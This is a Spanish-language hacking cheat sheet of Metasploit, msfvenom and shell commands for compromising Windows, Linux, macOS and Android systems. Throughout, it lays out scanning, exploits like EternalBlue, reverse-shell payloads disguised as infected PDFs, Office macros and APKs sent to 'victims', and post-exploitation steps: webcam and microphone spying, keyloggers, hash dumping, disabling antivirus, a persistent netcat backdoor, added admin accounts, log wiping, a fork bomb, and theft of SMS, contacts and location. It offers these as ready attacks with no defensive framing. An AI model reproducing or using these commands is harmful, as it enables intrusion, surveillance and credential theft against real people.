

------------------------------------------------------
////////////////////////////////////////////////////////////////////////////////////////////
////// INTRUSION CON EXPLOIT Y LINUX  /////////////////
//////////////////////////////////////////////////////////////////////////////////////
sudo su    //para quedar como super usuario de kalilinux
setxkbmap es sundeadkeys   //poner el teclado en espa�ol
sudo apt-get update

///////SCANEO 
nmap 192.168.0.0/24 > scaneo.txt //escaneaa todos los usuarios
nmap -sV  > scaneoversion.txt //version de los puertos abiertos
nmap 192.168.0.1/24 -p 22  //escanea todos los dispositivos conectados y muestra los que tiene el puerto 22 abierto

netdiscover -i eth0 -r 192.168.0.0/24  //escanea todos los usuarios de la red

use auxiliary/scanner/http/http_version
set rhost paginaweb.com
set rport 443
run

use auxiliary/scanner/smb/smb_ms17_010
set rhost <ip victima>
run

use auxiliary/scanner/portscan/syn
set INTERFACE eth0set PORTS 80set RHOSTS 192.168.1.0/24
set THREADS 50
run

use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.200-211
set THREADS 11
set PORTS 22,80,137,445
run

use auxiliary/scanner/x11/open_x11
set RHOSTS 192.168.1.1/24
set THREADS 50
run
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.200-254
set THREADS 55run

use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.150-165
set THREADS 16
run
use auxiliary/scanner/smtp/smtp_version
set RHOSTS 192.168.1.0/24
set THREADS 254
run

use auxiliary/scanner/smtp/smtp_enum   //muestra los posibles usuarios del smtp
set RHOSTS 192.168.1.56
run
use auxiliary/scanner/snmp/snmp_enum  //muestra la version y otros datos del snmp
set RHOSTS 192.168.1.2
run

use auxiliary/scanner/snmp/snmp_enumusers  //muestra los posibles usuarios del snmp
set RHOSTS 192.168.1.200-211set THREADS 11run

use auxiliary/scanner/netbios/nbname_probe   //muestra el nombre de la BIOS de la victima
set RHOSTS 192.168.1.200-210
set THREADS 11
run
use auxiliary/scanner/pop3/pop3_version  //muestra la version del pop3
set RHOSTS 192.168.1.200-250set THREADS 20
run


use auxiliary/scanner/http/enum_delicious  //muestra los dominios de la victima
set DOMAIN metasploit.com
run


use auxiliary/scanner/http/options  //muestra que tipo de codigo hay en un servidor
set RHOSTS 192.168.1.200-210
set THREADS 11
run
use auxiliary/scanner/http/ssl   //busca si hay certificado SSL en las victimas
set RHOSTS 192.168.1.200-254set THREADS 20
run


use auxiliary/scanner/http/http_version    //buca que version es el servidor web
set RHOSTS 192.168.1.0/24
set THREADS 255
run

use auxiliary/scanner/http/webdav_scanner    //Nos muestra si el servidor tiene activo el webdav
set RHOSTS 192.168.1.200-250
set THREADS 20
run

db_connect root:toor@localhost/wmap  //se inicia la base de datos de wmap
load wmap
wmap_targets -a http://192.168.1.204  //Wmap se usa para escanear servidores web y ver que SO tiene ese servidor
wmap_targets -p  //con el -p miramos que puerto tiene abierto ese servidor
wmap_run -e  //con el -e miramos que SO es el que esta en esa maquina 
db_hosts -c address,svcs,vulns  //miramos en la bd que servidores escaneamos y que vulnerabilidades tenemos
db_hosts -a 192.168.1.204 -c address,mac,svcsdb_vulns   //vemos la descripcion de la vulnerabilidad y copiamos lo que esta luego de REFS y lo desencriptamos
echo "BAhbByIIQ1ZFIg4yMDA1LTMzOTg=" | openssl base64 -d
db_exploited

load nessus
nessus_connect dook:s3cr3t@192.168.1.100 ok
nessus_policy_list
nessus_scan_new 1 pwnage 192.168.1.161nessus_scan_status
nessus_report_list  //aqui los arroja un resultado 
nessus_report_get 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
db_hosts -c address,vulns
 
db_vulns
db_exploited

///////BUSQUEDAS DENTRO DE MSFCONSOL

irb   //buscar exploits por puerto en msfconsol
framework.exploits.each_module { |n,e| x=e.new; print_good("#{e.fullname}: #{x.datastore['RPORT']}") if x.datastore['RPORT'].to_i == 445 }; nil

search <nombre de la version puerto abierto>   //en msf se puede buscar vulnerabilidad con el nombre del puerto

shred -zxuvf <nombre de archivo>  // elimina rastro puede ser cd /var/log/auth.log  o kern.log


//////EXPLOTACION DE WINDOWS


use exploit/windows/smb/ms17_010_eternalblue ---> //windows 7 y 8 de 64 bits con el service "microsoft-ds"
set rhost <ip de la victima>
set rport <port donde esta micresoft-ds>
run


use exploit/windows/smb/ms17_010_eternalblue_win8  // Windows server 2012, win 8, win10
set rhost <ip de la maquina victima>
set payload windows/x64/meterpreter/reverse_tcp
set rhost <ip de la maquina victima>
set lhost <ip de la maquina>
set rport <port abierto>
set smbpass <contrase�a>
set smbuser <usuario>
options
show payloads


use exploit/windows/smb/eternalblue_doublepulsar
set rhost <ip de la maquina victima>
set processinject explorer.exe
set payload windows/meterpreter/reverse_tcp
set rhost <ip de la maquina victima>
set lhost <ip de la maquina>
set rport <port abierto>


msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip del atacante> lport=4444 -f exe > virus.exe
msfconsole
use exploit/multi/handler 
use multi/hadler       //este comando o el de arriba
set payload windows/meterpreter/reverse_tcp
set lhost <ip del atacante>
set lport <port del atacante>
run
sendspace.com

use exploit/windows/fileformat/adobe_utilprintf    //Infectar un PDF
set FILENAME NombreLlamativo.pdf
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ipatacante>
set LPORT <portatacante>
exploit
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ipatacante>
set LPORT <portatacante>
exploit    //enviamos el pdf y esperamos a que la persona lo abra, es indetectable por antivirus
9999

use exploit/windows/smb/psexec
set rhost <ip victima>
set PAYLOAD windows/shell/reverse_tcp
set lhost <ip del atacante>
set rport <port abierto>
set SMBUSER victim
set SMBPASS s3cr3texploit

msfpayload windows/meterpreter/reverse_tcp LHOST=<ipatacante> LPORT=<portatacante> ENCODING=shikata_ga_nai V    //Infectar office
//luego el codigo que se muestra se copia en el office; vaya a Ver macros, coloque un nombre como "mu" y seleccione"crear".
//Esto abrir� el Editor de Visual Basic
msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=<ip del atacante> LPORT=<port del atacante> E   //se pone en espera a que abran el office

use exploit/multi/browser/java_signed_applet   ---> // windows 8 y luego de dar <java -version> en la consola del windows aparece version 1.7
set srvport 80
set uripath /
set payload windows/meterpreter/reverse_tcp
show option
set lhost <ip del atacante>    //la persona debe intentar entrar a la ip del atacante (http://192.168.1.17:8080) y aceptar el archivo que esta ahi
run
sessions -l
sessions -i 1

use exploit/multi/browser/firefox_xpi_bootstrapped_addon    //exploit para firefox
set payload generic/shell_reverse_tcp
set lhost <ip del atacante>
set srvhost <ip del atacante>
set srvport <puerto del atacante>
set uripath /
exploit         //luego de explotar, la victima debe abrir el ip y el puerto en el buscados firefox y descargar el exploit
sessions -l
sessions -i 1
ipconfig
https://www.hacking.land/2014/03/hackeando-un-pc-sin-vulnerabilidades.html?m=1

use exploit/windows/browser/ani_loadimage_chunksize
set URIPATH /
set PAYLOAD windows/shell/reverse_tcp
set lhost <ip del atacante>
set lport <port abierto>
exploit

use exploit/windows/browser/ms10_002_aurora   //exploit para internet explorer
set URIPATH /
set PAYLOAD windows/shell/reverse_tcp
set lhost <ip del atacante>
set lport <port abierto>
exploit -j


use exploit/windows/fileformat/ms15_100_mcl_exe  //para este exploit hay que enviarle un archivo a la victima
set srvhost <ip del atacante>
set payload windows/meterpreter/reverse_tcp
set lhost <ip del atacante>
exploit

use windows/fileformat/audacity
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ip del atacante>
exploit


use exploit/windows/fileformat/a-pdf_wav_to_mp3   //windows xpset OUTPUTPATH /var/www
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ip del atacante>
exploit
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.101
exploit

use exploit/windows/smb/ms08_067_netapi   // Todos los tipos de windows xp
set RHOST 10.211.55.140set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.211.55.162
set LANG english
show targets
set TARGET 8exploit

msfpayload windows/shell_reverse_tcp LHOST=<ip del atacante> LPORT=<port atacante> X > /tmp/1.exe      
msfconsole
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set LHOST <ip del atacante>
set LPORT <port atacante>
exploit


run post/windows/gather/hashdump   //esto va en el meterpreter dentro de la red y arroja un hash, lo copiamos y luego..
msfconsole
use exploit/windows/smb/psexec
set payload windows/meterpreter/reverse_tcp
set LHOST <ipatacante>
set LPORT <portatacante>
set RHOST <ipvictima>
set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c  //ponemos el hash que arrojo hashdump
exploit

msfconsole         //exploit para mysql 
use auxiliary/scanner/http/phpMyAdmin_login
set rhosts 192.168.1.171
set USER_AS_PASS true
set targeturi /phpMyAdmin/index.php
set user_file /tmp/users.txt
set pass_file /tmp/passwords.txt
run

use exploit/windows7dcerpc7ms07_029_msdns_zonename

use dos/windows/smb/ms09_001_write

git clone https://github.com/thelinuxchoice/spyeye
cd spyeye/
bash install.sh
chmod +x spyeye
puerto: 
payload name :
//Luego el programa genera un link que se le envia a la victima y si instala el archivo .exe el programa empieza a tomar screenshot

PHANTOMDOOR   //Puerta trasera para todas los SO
git clone https://github.com/venom0x16/PhantomDoor
cd PhantomDoor/
chmod +x PhantomDoor.py
./PhantomDoor.py
https://esgeeks.com/phantomdoor-hacking-windows-linux-macos-android-con-backdoor/?fbclid=IwAR33PQwUvV6_GmVzC4Xw76ECLQ-9MaQTz1111m9chgQHAk28muhk2MvzJlU



//////// POST EXPLOTACION WINDOWS

?    //luego de estar adentro de el win8 en metepreter escribimos este signo para ver que podemos hacer
sysinfo  // informacion sobre el computador vulnerado
idletime //muestra cuanto tiempo ha estado inactivo la victima
screenshot //dentro del meterpreter con este comando tomamos una foto de la pantalla
webcam_list   //ver lista de camaras conectadas en el computador
webcam_snap  // tomar foto de la camara de la victima
webcam_stream  //muestra lo que esta captando la camara
run webcam -p /root //va tomando varias fotos y las muestra en mozilla
run webcam -i 2 -p /root  //para grabar en la camara 2
shell     //acceder al los archivos del computador
getsystem  // Intentar� elevar los privilegios al m�ximo
pwd       //muestra donde esta el usuario del windows
run checkvm     //verifica si es una maquina virtual
run get_application_list   //muestra las aplicaciones instaladas en el pc de la victima
keyscan_start  //activa un tipo de keylogger
keyscan_dump   //muestra lo optenido por el keylogger
keyscan_stop   //para el keylogger
netstat -ano   // ver las comunicaciones dentro de la victima
run scraper  //guarda los logs de la victima, para ver los logs hay que ir a otra terminal y dar "ls -a" luego "cd .msf4" "cd logs" "cd scripts" "cd scraper" "cd todo los numeros que hay" "cat network.txt"
run arp_scanner -r 192.168.0.1/24   //muestra otras maquinas del mismo segmento ip
run gettelnet -e  //activar telnet en la victima
run killav   //desactiva el antivirus de la victima
run get_local_subnets  //muestra la mascara de red de la victima
run winenum
  // detallada enumeraci�n de las ventanas. Vuelca tokens, hashes y mucho m�s.
run scraper   //toma informacion del sistema y sus registros
netsh firewall show state  //ver estado del firewall
netsh advfirewall firewall add rule name="salida troyano" dir=in action= allow protocol=TCP localport=12345  //agregar regla al firewall, permitir el puerto 12345
net user remoto juancarlos /add   agregar usuario   //crea usuario
net localgroup administradores remoto /add          //agregar usuario a administradores
search -f *.jpg  //busca todos los archivos jpgsearch -f *.pdf  //busca todos los archivos pdf
search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.pdf  //busca exactamente en unas carpetas
download  c:\\boot.ini  //descarga un archivo 
upload virus.exe c:\\windows\system32  // sube un archivo a la victima
execute -f cmd.exe -i  // ejecuta cmd dentro de la victima
execute -f virus.exe -i -H  //ejecuta un archivo dentro de la victima
clearev // borra los rastros en el computador de la victima
run clearlogs  //borra los log de la victima
reboot  // recetear el win8
background  // guardar session

download  c:\\boot.

irb
client.sys.config.sysinfo   //sirve para obtener el nombre de la m�quina del host de la victima
client.sys.config.sysinfo['OS']
  //version del sistema operativo
client.sys.process.getpid  //Sesion que se esta ejecutando

run post/windows/manage/migrate
run post/windows/capture/keylog_recorder  //instalamos el keyloger
cat /root/.msf3/loot/nombredelarchivoquegeneroenkeyloger.txt  //para ver la informacion del keyloger
run post/multi/gather/firefox_creds  //captura las cookies y credenciales de un computador
run post/windows/gather/enum_applications  //muestra las aplicaciones instaladas en la victima
run post/windows/gather/usb_history  //muestra la historia del puerto usb
run post/windows/manage/delete_user USERNAME=hacker
  //borra el usuario hacker de la victima

upload /pentest/windows-binaries/tools/nc.exe C:\\windows\\system32   //Abrir puerta trasera en al victima. se sube netcat en el system32 de la victima
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'   //activamos el nc en el puerto 445
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
execute -f cmd -i
netsh firewall show opmode
netsh firewall add portopening TCP 455 "Service Firewall" ENABLE ALL //activamos el nc en el puerto 445
netsh firewall show portopening
nc -v 172.16.104.128 455   //abro otro terminal y ingreso a la puerta trasera 


////// EXPLOTACION LINUX

msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=<ipatacante> lport=<portatacante> -f elf -o /var/www/html/virus.elf
service apache2 start    //La victima debe entrar a la direccion ip de el atacante ejemplo 192.168.0.16/virus.elf
msfconsole
use exploit/multi/handler/
set payload linux/x86/meterpreter/reverse_tcp
set lhost <ipatacante>
set lport <PortatAcanteYaEscogido>
run
https://www.youtube.com/watch?v=BZN2zNymMZM   min6
port 4321

use exploit/unix/ftp/vsftpd_234_backdoor  ---> //servidor Linux vulnerabilidad FTP vsftpd 2.3.4
set rhosts <ip victima>
run

use exploit/unix/irc/unreal_ircd_3281_backdoor
set rhost <ipvictima>
set rport <portdondeestaelirc>
run
https://www.youtube.com/watch?v=p5xnMHAeIxE
INSTALAR UN IRCD QUE DA VULNERABILIDAD https://www.linuxito.com/gnu-linux/nivel-alto/502-instalacion-y-configuracion-basica-de-un-servidor-irc-en-debian

use exploit/multi/script/web_delivery
show targets
set target 1
set payload php/meterpreter/reverse_tcp
set lhost <ipAtacante>
run  //el ultimo link que sale "php d allow_url_fopen" se pone en el terminal de la victima y eso crea la sessions
sessions -1
https://www.youtube.com/watch?v=qVFoxAGLIdU

use exploit/multi/samba/usermap_script
set payload cmd/unix/bind_perl
set rhost <ipvictima>
run

use exploit/linux/misc/gld_postfix  ---->  //linux redhat
set rhosts <ip victima>
pwd
root

set payload cmd/unix/reverse
unset payload cmd/unix/interact  //quita el payload cmd..


///////POST EXPLOTACION LINUX
sysinfo
ifconfig
help  //ver los comandos que puedo usar 
ps //procesos activos en linux
reboot  //recetea el linux 

cd/ var
ls


shell  
whoami //para ver que usuario tenemos
show interfaces
netstat -a > procesos.txt  //guarda los datos que muestra el netstat
traceroute -a > ruta.txt  // guarda la ruta que toma un mensaje
whereis  //muestra la ubicacion de un archivo en especial
startx  //inicia el entorno grafico
poweroff  //apagar
reboot   //reinicia
mkdir <nombre> //crea una carpeta
rmdir <nombre> //borra carpeta
nano <nombre>  //edita un archivo
cat <nombre>  //muestra lo que esta dentro del archivo
get <nombe> // descarga el archivo a nuestro linux
:(){ :|: & };:   //es una funci�n bash. Una vez ejecutada, se repite varias veces hasta que el sistema se bloquea.

history  //lista de comandos ejecutados
w // inicio de sesion ip y hora
last //detalles de inicio de session 
ps auxf  //nformaci�n sobre los procesos en ejecuci�n.
netstat -plunt  //puertos abiertos

use post/linux/gather/enum_services
set session 1
run 
cat /root/.msf3/loot/20110602161959_default_192.168.184.130_linux.services_184278.txt

cat /etc/passwd   //usuarios y contrase�as 
cat /etc/shadow   //puede haber mas informacion de usuarios y contrase�as
cat /etc/groups   //informacion relacionada a grupos
cat /etc/login.defs  //valores por defecto
cat /etc/shells   //lista de shells validas
cat /etc/securetty    //tiene informacion sobre puertos




///// EXPLOTACION DE MAC OSX
msfvenom -p osx/x86/shell_reverse_tcp lhost=<ipatacante> lport=<portatacante> -f macho -o shell_macho.macho
msfconsole 
use multi/handler
set payload osx/x86/shell_reverse_tcp
set lhost <ipatacante>
set lport <portatacante>
run

msfvenom -p python/meterpreter/reverse_tcp lhost=<ipatacante> lport=<portatacante> -o > virus.py
msfconsole 
use multi/handler
set payload python/meterpreter/reverse_tcp
set lhost <ipatacante>
set lport <portatacante>
run

msfpayload osx/x86/isight/bind_tcp X > /tmp/osxt2
msfconsole
use multi/handler
set PAYLOAD osx/x86/isight/bind_tcp	
ifconfig eth0
set RHOST <ipvictima>exploit

msfvenom -p osx/x86/shell_reverse_tcp lhost=<ipatacante> lport=<portatacante> -f macho -o shell_macho.dmg

///// EXPLOTACION DE ANDROID

msfvenom -p android/meterpreter/reverse_tcp lhost=<ipatacante> lport=<portatacante> r> /var/www/html/virus.apk
msfconsole
use exploit/multi/handler/
set payload android/meterpreter/reverse_tcp
set lhost <ipatacante>
set lport <PortatAcanteYaEscogido>
run
sendspace.com
sendspace.com/file/2321j5 - port 1234


msfconsole
use exploit/android/adb/adb_server_exec
set rhost <ipvictima>
show targets
set target 1 
set payload linux/x86/meterpreter/reverse_tcp
set lport 4444
set lhost <ipatacante>
run

///// POST EXPLOTACION DE ANDROID

localtime
webcam_list   //ver lista de camaras conectadas en el computador
webcam_snap  // tomar foto de la camara de la victima
webcam_snap -i 2  // tomar foto de la camara de la victima
webcam_stream  //muestra lo que esta captando la camara
run webcam -p /root //va tomando varias fotos y las muestra en mozilla
run webcam -i 2 -p /root  //para grabar en la camara 2
record_mic -d 20 //Grabar 20s de audio
dump_sms  //muestra un txt con los mensajes
dump_calllog   //muestra un txt con las llamadas
dump_contacts   //muestra un txt con los contactos
geolocate
lan_geolocate
wlan_geolocate
interval_collect -c geo -t 15 -a start  //empieza a calcular geolocalizacion cuando le damos star
interval_collect -c geo -t 15 -a stop   //muestra el calculo geolocalizacion cuando le damos stop
activity_start tell:231123123
activity_start content://contacts/people/1
send_sms -d +573001234567 -t "hacked"
rm <archivo> // Eliminar archivo
rmdir <carpeta> //Eliminar carpeta
mkdir <dir> // Crear carpeta

shell
cd /sdcard
ls
cd <CarpetaDeseada>
download <archivo>
